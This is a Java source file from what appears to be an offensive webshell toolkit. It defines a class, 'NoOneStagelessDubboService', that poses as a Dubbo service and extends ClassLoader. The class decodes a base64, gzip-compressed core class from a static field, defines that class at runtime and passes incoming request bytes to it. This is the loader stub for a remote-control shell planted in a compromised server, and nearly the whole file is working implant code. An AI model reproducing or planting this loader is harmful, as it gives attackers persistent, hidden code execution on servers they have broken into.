package com.reajason.noone.core.shelltool;

import java.io.*;
import java.util.zip.GZIPInputStream;

public class NoOneStagelessDubboService extends ClassLoader {
    private static Class<?> coreClass = null;
    private static String coreGzipBase64;

    public NoOneStagelessDubboService() {
    }

    public NoOneStagelessDubboService(ClassLoader parent) {
        super(parent);
    }

    public byte[] handle(byte[] bytes) {
        try {
            if (coreClass == null) {
                byte[] coreBytes = gzipDecompress(decodeBase64(coreGzipBase64));
                coreClass = new NoOneStagelessDubboService(Thread.currentThread().getContextClassLoader()).defineClass(coreBytes, 0, coreBytes.length);
            }
            byte[] payload = transformReqPayload(getArgFromContent(bytes));
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            Object httpChannelCore = coreClass.newInstance();
            httpChannelCore.equals(new Object[]{payload, outputStream});
            return wrapResData(transformResData(outputStream.toByteArray()));
        } catch (Throwable e) {
            return getStackTraceAsString(e).getBytes();
        }
    }

    private byte[] getArgFromContent(byte[] content) {
        return content;
    }

    private byte[] transformReqPayload(byte[] input) {
        return input;
    }

    private byte[] wrapResData(byte[] payload) {
        return payload;
    }

    private byte[] transformResData(byte[] payload) {
        return payload;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Throwable e) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    private String getStackTraceAsString(Throwable throwable) {
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        throwable.printStackTrace(pw);
        return sw.toString();
    }
}
